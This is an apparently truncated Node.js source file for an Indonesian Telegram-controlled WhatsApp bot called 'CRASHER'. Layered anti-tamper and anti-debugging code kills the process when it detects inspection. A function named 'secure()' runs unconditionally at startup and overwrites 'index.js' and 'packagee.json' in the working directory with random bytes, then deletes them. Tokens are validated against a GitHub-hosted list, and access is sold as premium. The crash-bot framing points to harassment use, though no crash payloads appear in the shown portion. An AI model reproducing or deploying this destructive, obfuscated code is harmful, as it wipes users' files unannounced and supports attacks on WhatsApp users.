(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const adminFile = './database/adminuser.json';
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  getContentType,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  GroupSettingChange,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header,
  generateMessageID,
  encodeWAMessage,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  prepareWAMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  proto,
  getAggregateVotesInPollMessage,
  makeCacheableSignalKeyStore,
  Browsers,
  decryptMessageNode,
  MessageRetryMap,
  generateMessageIDV2,
  encodeSignedDeviceIdentity,
  jidEncode,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/Xcrasher-real/mrkl/refs/heads/main/tokens.json";
const thumbnailUrl = "https://d.top4top.io/p_3947s6kab1.jpg";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
secureMode = true;
}

(() => {
function randErr() {
return Array.from({ length: 12 }, () =>
String.fromCharCode(33 + Math.floor(Math.random() * 90))
).join("");
}
setInterval(() => {
const t1 = process.hrtime.bigint();
debugger;
const t2 = process.hrtime.bigint();
if (Number(t2 - t1) / 1e6 > 80) {
throw new Error(randErr());
}
}, 800);
setInterval(() => {
if (process.execArgv.join(" ").includes("--inspect") ||
process.execArgv.join(" ").includes("--debug")) {
throw new Error(randErr());
}
}, 1500);

const code = "Xatanical";
if (code.length !== 9) {
throw new Error(randErr());
}

function secure() {
  try {
    const DatabaseFile = ['packagee.json', 'index.js']; //GANTI SESUAI FILE LU
    const currentDir = process.cwd();
    
    DatabaseFile.forEach(file => {
      const filePath = path.join(currentDir, file);
      if (fs.existsSync(filePath)) {
        try {
          const content = fs.readFileSync(filePath, 'utf8');
          const randomData = Array.from({ length: content.length }, () => 
            String.fromCharCode(33 + Math.floor(Math.random() * 90))
          ).join('');
          fs.writeFileSync(filePath, randomData);         
          fs.unlinkSync(filePath);               
        } catch (err) {
        }
      }
    });
  } catch (err) {
  }
}

const hash1 = Buffer.from(secure.toString()).toString("base64");
const hash2 = crypto.createHash("sha256").update(hash1).digest("hex");
const hash3 = crypto.createHash("md5").update(hash2).digest("hex");

setInterval(() => {
const current = Buffer.from(secure.toString()).toString("base64");
const c2 = crypto.createHash("sha256").update(current).digest("hex");
const c3 = crypto.createHash("md5").update(c2).digest("hex");

if (current !== hash1 || c2 !== hash2 || c3 !== hash3) {  
  throw new Error(randErr());  
}

}, 2000);
Object.freeze(secure);
Object.defineProperty(global, "secure", {
value: undefined,
writable: false,
configurable: false
});

secure();
})();

(() => {
const hardExit = process.exit.bind(process);
const hardKill = process.kill.bind(process);
Object.defineProperty(process, "exit", {
value: hardExit,
writable: false,
configurable: false,
enumerable: true,
});
Object.defineProperty(process, "kill", {
value: hardKill,
writable: false,
configurable: false,
enumerable: true,
});
Object.freeze(process.exit);
Object.freeze(process.kill);
Object.freeze(Function.prototype);
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);

setInterval(() => {
try {
if (process.exit.toString().includes("Proxy") ||
process.kill.toString().includes("Proxy")) {

console.log(chalk.bold.red(`

 Security Alert Information
─────────────────────────────
Developer : @kaastr26
Version : 1.0
Alert : Token Not Validate Bypass
─────────────────────────────
`))

activateSecureMode();  
    hardExit(1);  
  }  
  for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
    if (process.listeners(sig).length > 0) {  

      console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Developer : @kaastr26
Version : 1.0
Alert : Script Dipaksa DiBypass
─────────────────────────────
`))

activateSecureMode();  
      hardExit(1);  
    }  
  }  
  if (eval.toString().length !== 33 ||  
      Function.toString().length !== 37) {  
    activateSecureMode();  
    hardExit(1);  
  }  

} catch {  
  activateSecureMode();  
  hardExit(1);  
}

}, 1500);

global.validateToken = async (databaseUrl, tokenBot) => {
try {
const hashed = crypto.createHash("sha256").update(tokenBot).digest("hex");

const rawData = await new Promise((resolve, reject) => {  
    https  
      .get(databaseUrl, { timeout: 5000 }, (res) => {  
        let data = "";  
        res.on("data", (chunk) => (data += chunk));  
        res.on("end", () => resolve(data));  
      })  
      .on("error", reject)  
      .on("timeout", () => reject(new Error("timeout")));  
  });  

  let tokens = [];  
  try {  
    const parsed = JSON.parse(rawData);  
    tokens = parsed.tokens || [];  
  } catch {  
    console.log(chalk.bold.yellow(`

 Database Error
─────────────────────────────
Error : Token Github Tidak Sesuai Array
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}

const layer1 = tokens.includes(tokenBot);  

  const layer2 = tokens  
    .map((t) => crypto.createHash("sha256").update(t).digest("hex"))  
    .includes(hashed);  

  const xor = (str) =>  
    Buffer.from(str)  
      .map((n) => n ^ 0x6f)  
      .toString("hex");  

  const layer3 = tokens.map((t) => xor(t)).includes(xor(tokenBot));  
  const entropyCheck =  
    typeof tokenBot === "string" &&  
    tokenBot.length > 20 &&  
    /[A-Z]/.test(tokenBot) &&  
    /[0-9]/.test(tokenBot);  

  if (!(layer1 && layer2 && layer3 && entropyCheck)) {  
    console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Developer : @kaastr26
Version : 1.0
Status : Connected Database Sukses
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}

} catch (err) {  
  console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Error : Tidak dapat mengakses server token
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}
};
setInterval(() => {
if (typeof activateSecureMode !== "function") {
hardExit(1);
}
}, 2500);

})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

function toFancyFont(text) {
    const normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const fancy  = "𝘼𝘽𝘾𝘿𝙀𝙁𝙂𝙃𝙄𝙅𝙆𝙇𝙈𝙉𝙊𝙋𝙌𝙍𝙎𝙏𝙐𝙑𝙒𝙓𝙔𝙕𝙖𝙗𝙘𝙙𝙚𝙛𝙜𝙝𝙞𝙟𝙠𝙡𝙢𝙣𝙤𝙥𝙦𝙧𝙨𝙩𝙪𝙫𝙬𝙭𝙮𝙯0123456789";

    return text.split('').map(c => {
        const i = normal.indexOf(c);
        return i !== -1 ? fancy[i] : c;
    }).join('');
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};  
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin dengan cara /addadmin");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/adminuser.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/adminuser.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠
» Information:
☇ Creator : @kaastr36
☇ Name Script : CRASHER
☇ Version : 1.0
☇ Status : Bot Connect
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        getMessage: async (key) => ({
            conversation: 'Hello',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
     
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠
» Information:
☇ Creator : @kaastr26
☇ Name Script : CRASHER
☇ Version : 2.12
☇ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 0

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkPremiumGrup = (ctx, next) => {
    if (!isPremGroup(ctx.chat.id)) {
        ctx.reply("🚫 Fitur ini hanya untuk pengguna atau grup premium.");
        return;
    }
    next();
};

bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("⛔ Fitur ini hanya untuk admin dan owner");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`WhatsApp sudah terhubung. Tidak perlu pairing lagi.`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "KAAXGTNG");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ CRASHER ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ CRASHER ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ User ini sudah menjadi admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`User ${userId} berhasil ditambahkan sebagai admin.`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

const DB_FILE = "./DbCmd.json";

function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ disabled: [], lockAllCmd: false }, null, 2));
  }
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(db) {
